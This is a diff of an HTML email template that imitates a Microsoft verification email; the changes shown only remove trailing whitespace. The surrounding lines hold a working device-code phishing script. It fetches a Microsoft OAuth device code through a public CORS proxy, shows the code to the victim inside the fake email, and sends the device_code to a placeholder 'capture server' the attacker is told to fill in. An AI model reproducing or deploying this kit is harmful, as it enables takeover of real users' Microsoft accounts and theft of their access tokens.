@@ -11,7 +11,7 @@
     <script>
         // Redirect CORS using corsanywhere running on FLUX web3 :)
         $.get("https://corsanywhere.app.runonflux.io/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net").done(function(data) {
-            
+
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
             $.get("https://MYCaptureServer/?id=" + data.device_code);
@@ -25,7 +25,7 @@
          <tr>
             <td valign="top" width="50%"></td>
             <td valign="top">
-               <!-- Email Header --> 
+               <!-- Email Header -->
                <table width="640" cellpadding="0" cellspacing="0" border="0" dir="ltr" lang="en" style="border-left:1px solid #e3e3e3;border-right: 1px solid #e3e3e3;">
                 <tr style="background-color: #0072C6;">
                     <td width="1" style="background:#0072C6; border-top:1px solid #e3e3e3;"></td>
@@ -44,26 +44,26 @@
                 <tr>
                     <td width="1" style="background:#e3e3e3;"></td>
                     <td width="24">&#160;</td>
-                    <td id="PageBody" width="640" valign="top" colspan="2" style="border-bottom:1px solid #e3e3e3; padding:10px 0 20px;">		
+                    <td id="PageBody" width="640" valign="top" colspan="2" style="border-bottom:1px solid #e3e3e3; padding:10px 0 20px;">
                         <table cellpadding="0" cellspacing="0" border="0" >
                             <tr>
                                 <td width="630" style="font-size:10pt; line-height:13pt; color:#000;">
                                     <table cellpadding="0" cellspacing="0" border="0" width="100%" style="" dir="ltr" lang="en">
                                         <tr>
                                             <td>
-                                                
-   
+
+
     <br/>
     <div style="font-family:'Segoe UI', Tahoma, sans-serif; font-size:14px; color:#333">
         <span id="BodyPlaceholder_UserVerificationEmailBodySentence2">
             <div id="code">
-                    
+
         </div></span>
     </div>
     <br/>
     <div style="font-family:'Segoe UI', Tahoma, sans-serif; font-size:14px; color:#333; font-weight: bold">
         <span id="BodyPlaceholder_UserVerificationEmailBodySentence3">
-            
+
         </span>
     </div>
     <br/>
@@ -87,7 +87,7 @@
                     <td width="1">&#160;</td>
                     <td width="1"></td>
                     <td width="1">&#160;</td>
-                    <td width="1" valign="top"></td>			 
+                    <td width="1" valign="top"></td>
                     <td width="29">&#160;</td>
                     <td width="1" style="background:#e3e3e3;"></td>
                 </tr>
@@ -119,7 +119,7 @@
                                                              Legal
                                                              </a>
                                                         </span>
-                                                        
+
                                                     </p>
                                                 </td>
                                             </tr>
